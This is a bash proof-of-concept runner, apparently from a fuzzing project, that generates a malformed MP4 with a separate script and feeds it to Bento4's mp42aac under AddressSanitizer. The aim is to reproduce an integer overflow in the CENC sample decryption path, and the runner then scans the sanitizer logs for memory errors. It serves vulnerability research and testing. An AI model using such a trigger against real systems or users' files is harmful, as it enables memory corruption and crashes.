#!/usr/bin/env bash
# VULN-002 PoC Runner
# Tests integer overflow in AP4_CencSingleSampleDecrypter::DecryptSampleData

set -u

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4CommonEncryption_cpp"
BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
INPUT="$POC_DIR/vuln_002.mp4"
RESULT="$POC_DIR/vuln_002_result.txt"
ASAN_LOG_PREFIX="$POC_DIR/asan.log"

# ASAN options: write log to file, don't abort (allow completion), full symbolization
export ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}:detect_odr_violation=0"

echo "=== VULN-002 PoC Run: $(date) ===" > "$RESULT"
echo "" >> "$RESULT"

# Step 1: Generate the malicious MP4
echo "[*] Generating vuln_002.mp4..." | tee -a "$RESULT"
python3 "$POC_DIR/vuln_002_gen.py" 2>&1 | tee -a "$RESULT"
echo "" >> "$RESULT"

if [ ! -f "$INPUT" ]; then
    echo "[-] ERROR: MP4 generation failed" >> "$RESULT"
    exit 1
fi

echo "[*] Binary: $BINARY" >> "$RESULT"
echo "[*] Input:  $INPUT" >> "$RESULT"
echo "[*] File size: $(wc -c < "$INPUT") bytes" >> "$RESULT"
echo "" >> "$RESULT"

# Step 2: Run without --key (no decryption attempted)
echo "--- Run 1: without --key (parsing only) ---" | tee -a "$RESULT"
"$BINARY" "$INPUT" /dev/null >> "$RESULT" 2>&1 || true
echo "[exit code: $?]" >> "$RESULT"
echo "" >> "$RESULT"

# Step 3: Run with --key (triggers DecryptAndWriteSamples path)
# Key: 32 hex chars = 16 bytes of zeros
echo "--- Run 2: with --key 00000000000000000000000000000000 ---" | tee -a "$RESULT"
"$BINARY" --key 00000000000000000000000000000000 "$INPUT" /dev/null >> "$RESULT" 2>&1 || true
echo "[exit code: $?]" >> "$RESULT"
echo "" >> "$RESULT"

# Step 4: Check ASAN log files for errors
echo "--- ASAN Log Analysis ---" | tee -a "$RESULT"
ASAN_FOUND=0
for asan_file in "${ASAN_LOG_PREFIX}".*; do
    if [ -f "$asan_file" ]; then
        echo "[*] Found ASAN log: $asan_file" | tee -a "$RESULT"
        if grep -qE "ERROR:|SUMMARY:|heap-buffer-overflow|heap-use-after-free|SEGV|integer overflow" "$asan_file" 2>/dev/null; then
            echo "[!] ASAN/UBSAN error detected:" | tee -a "$RESULT"
            grep -E "ERROR:|SUMMARY:|heap-buffer-overflow|heap-use-after-free|SEGV|integer overflow|AddressSanitizer|in .*DecryptSampleData|in .*ProcessBuffer" "$asan_file" | head -20 | tee -a "$RESULT"
            ASAN_FOUND=1
        else
            echo "[*] ASAN log contains no critical errors" | tee -a "$RESULT"
            cat "$asan_file" | head -10 >> "$RESULT"
        fi
    fi
done

if [ "$ASAN_FOUND" -eq 0 ]; then
    echo "[*] No ASAN errors detected in log files" | tee -a "$RESULT"
fi

echo "" >> "$RESULT"
echo "=== Run complete ===" >> "$RESULT"
